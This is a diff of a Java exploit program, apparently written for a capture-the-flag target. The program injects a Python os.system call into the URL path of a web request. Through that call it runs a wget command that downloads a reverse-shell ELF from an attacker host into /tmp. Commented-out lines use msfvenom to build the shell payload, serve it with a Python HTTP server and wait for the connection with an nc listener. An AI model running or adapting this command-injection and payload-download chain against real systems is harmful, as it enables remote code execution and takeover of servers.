@@ -2,6 +2,7 @@ package COM.spti.spti;
 import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
+import java.net.ProtocolException;
 import java.net.URL;
 
 import threads.CommandThread;
@@ -14,10 +15,10 @@ public class App {
 		String LHOST = args[0];
 		String LPORT = args[1];
 		
-		String cmd = "msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f elf -o jj.elf";
+		/*String cmd = "msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f elf -o jj.elf";
 		ejecutar(cmd);
 		
-		CommandThread servidorPy = new CommandThread("python -m SimpleHTTPServer 80"); 
+		//CommandThread servidorPy = new CommandThread("python -m SimpleHTTPServer 80"); 
 		//servidorPy.start();
 		
 		
@@ -29,12 +30,31 @@ public class App {
 		get(cmd);
 		System.out.println(cmd + " 2");
 		
-		CommandThread escuchando = new CommandThread("nc -nvlp " + LPORT); 
+		//CommandThread escuchando = new CommandThread("nc -nvlp " + LPORT); 
 		//escuchando.start();
+		
 		System.out.println("SERVIDOR>>>>>>" + "nc -nvlp " + LPORT);
 		cmd = "/tmp/jj.elf";
 		get(cmd);
 		System.out.println(cmd + " 3");
+		*/
+		String cmd = "wget http://10.10.16.50/jj.elf -O /tmp/jj.elf";
+		URL url;
+		try {
+			url = new URL("http://10.10.10.168:8080/';path='/';os.system("+"'"+cmd+"'"+");"+"'");
+			HttpURLConnection con = (HttpURLConnection) url.openConnection();
+			con.setRequestMethod("GET");
+		} catch (MalformedURLException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (ProtocolException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		
 		
 				
 	}
